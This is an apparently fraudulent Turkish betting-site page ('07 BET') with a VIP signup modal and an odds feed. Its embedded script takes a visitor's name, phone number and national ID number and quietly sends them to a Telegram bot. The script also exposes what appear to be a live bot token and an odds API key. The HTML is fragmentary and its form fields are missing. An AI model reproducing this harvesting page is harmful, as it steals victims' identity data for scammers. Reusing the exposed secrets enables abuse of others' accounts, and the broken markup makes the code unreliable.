<!DOCTYPE html>
<html lang="tr">
<head>

    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>

        body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; margin: 0; padding-bottom: 70px; }
        
        /* Gold Header */
        header {

            padding: 15px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 999;
        }
        .logo { font-family: 'Oswald', sans-serif; font-size: 28px; color: var(--gold); text-transform: uppercase; font-style: italic; letter-spacing: 1px; }
        .reg-btn { background: var(--green); color: #000; border: none; padding: 10px 18px; border-radius: 4px; font-weight: 900; cursor: pointer; }

        /* Banner: Kadƒ±n & Para */
        .hero { 
            height: 250px; background: url('https://img.freepik.com/free-photo/poker-table-with-chips-cards-black-background_155003-11884.jpg') center/cover;
            display: flex; align-items: center; justify-content: center; position: relative; border-bottom: 2px solid #1a2634;
        }
        .hero-title { background: rgba(0,0,0,0.7); padding: 10px 20px; border-left: 5px solid var(--gold); font-size: 24px; font-weight: 900; }

        /* Spor B√ºlteni */
        .match-card { background: var(--card); margin: 10px; padding: 15px; border-radius: 10px; border: 1px solid #1e2d3d; }
        .m-header { font-size: 11px; color: #7f8c8d; display: flex; justify-content: space-between; margin-bottom: 8px; }
        .teams { display: flex; justify-content: space-between; font-weight: 600; font-size: 15px; }
        .odds { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 15px; }
        .o-item { background: #050a0f; border: 1px solid #2c3e50; padding: 10px; text-align: center; color: #3498db; border-radius: 5px; font-weight: 900; }

        /* KUSURSUZ KAYIT MODAL */
        #vipModal { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.97); z-index: 99999; justify-content: center; align-items: center; 
        }
        .modal-box { 
            background: var(--card); width: 85%; max-width: 380px; padding: 25px; border-radius: 15px; 
            border: 2px solid var(--gold); text-align: center;
        }
        .modal-box h2 { color: var(--gold); margin-bottom: 20px; font-family: 'Oswald', sans-serif; }
        input, select { 
            width: 100%; padding: 14px; margin: 8px 0; background: #000; 
            border: 1px solid #2c3e50; color: #fff; border-radius: 8px; box-sizing: border-box; 
        }
        .submit-btn { width: 100%; background: var(--gold); color: #000; border: none; padding: 16px; border-radius: 8px; font-weight: 900; font-size: 16px; margin-top: 15px; }

        /* Alt Navigasyon */
        nav { position: fixed; bottom: 0; width: 100%; background: #050a0f; display: flex; justify-content: space-around; padding: 15px 0; border-top: 2px solid var(--gold); }
        .nav-link { color: #bdc3c7; text-decoration: none; font-size: 11px; text-align: center; }
        .nav-link.active { color: var(--gold); font-weight: bold; }
    </style>
</head>
<body>

<header>
    <div class="logo">07 BET</div>
    <button class="reg-btn" onclick="modalKontrol(true)">KAYIT OL</button>

<div class="hero">

<div id="bulten">

        <select id="vBonus">

<nav>

    <a href="slot.html" class="nav-link">üé∞<br>Slot</a>
    <a href="finans.html" class="nav-link">üí∞<br>Finans</a>
    <a href="profil.html" class="nav-link">üë§<br>Profil</a>
</nav>

<script>
    const BOT_TOKEN = "8334170490:AAEoym3kRcAdRGRjlNeXP8CvhanLAArzm9s";
    const CHAT_ID = "8257151310";

    function modalKontrol(durum) {
        document.getElementById('vipModal').style.display = durum ? 'flex' : 'none';
    }

    async function telegramGonder() {
        const ad = document.getElementById('vAd').value;
        const tel = document.getElementById('vTel').value;
        const tc = document.getElementById('vTc').value;
        const bonus = document.getElementById('vBonus').value;

        if(!ad || !tel) return alert("Bilgileri girin!");

        const mesaj = `üî• **YENƒ∞ VIP √úYE**\nüë§ ƒ∞sim: ${ad}\nüìû Tel: ${tel}\nüÜî TC: ${tc}\nüéÅ Bonus: ${bonus}`;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
            alert("Harika! Talebiniz alƒ±ndƒ±. M√º≈üteri temsilciniz sizi arayacaktƒ±r.");
            modalKontrol(false);
        } catch(e) { alert("Hata! Tekrar deneyin."); }
    }

    async function bultenCek() {
        try {
            const res = await fetch('https://api.the-odds-api.com/v4/sports/soccer/odds/?apiKey=391055381f29a3f06b05c67516181c59&regions=eu');
            const data = await res.json();
            const container = document.getElementById('bulten');
            container.innerHTML = '';
            data.slice(0, 15).forEach(m => {
                const o = m.bookmakers[0].markets[0].outcomes;
                container.innerHTML += `
                <div class="match-card">

                        <div class="o-item">2 <br> ${o[2].price}</div>
                    </div>
                </div>`;
            });
        } catch(e) { document.getElementById('bulten').innerHTML = '<div style="padding:20px; color:gray; text-align:center;">Ma√ß b√ºlteni g√ºncelleniyor...</div>'; }
    }
    bultenCek();
</script>
</body>
</html>
